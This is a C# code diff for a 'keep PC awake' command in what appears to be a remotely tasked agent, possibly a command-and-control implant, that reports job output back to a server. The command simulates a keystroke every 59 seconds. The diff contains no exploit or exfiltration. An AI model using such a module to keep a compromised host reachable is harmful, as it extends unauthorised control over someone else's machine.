@@ -15,7 +15,7 @@ namespace Agent
         private const int KEYEVENTF_EXTENDEDKEY = 0x0001;
         private const int KEYEVENTF_KEYUP = 0x0002;
         private static bool running = false;
-
+        private CancellationTokenSource cts = new CancellationTokenSource();
 
         private static void PressKey(byte keyCode)
         {
@@ -35,30 +35,35 @@ namespace Agent
 
         public async Task Execute(ServerJob job)
         {
+
             Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
             try
             {
                 if (running)
                 {
-                    running = false;
-                    messageManager.Write("Letting computer sleep", job.task.id, true);
+                    cts.Cancel();
+                    messageManager.WriteLine("Letting computer sleep", job.task.id, true);
 
                 }
                 else
                 {
-                    messageManager.Write("Keeping PC awake", job.task.id, true);
-                    running = true;
-                    while (running)
+                    messageManager.WriteLine("Keeping PC awake", job.task.id, false);
+                    Task.Run(() =>
                     {
-                        //PressKey(VK_F15);
-                        ReleaseKey(VK_F15);
-                        Thread.Sleep(59000); // Press the key every 59 seconds
-                    }
+                        running = true;
+                        while (!cts.IsCancellationRequested)
+                        {
+                            //PressKey(VK_F15);
+                            ReleaseKey(VK_F15);
+                            Thread.Sleep(59000); // Press the key every 59 seconds
+                        }
+                        messageManager.WriteLine("Done.", job.task.id, true);
+                    }, cts.Token);
                 }
             }
             catch (Exception e)
             {
-                messageManager.Write(e.ToString(), job.task.id, true, "error");
+                messageManager.WriteLine(e.ToString(), job.task.id, true, "error");
             }
         }
     }
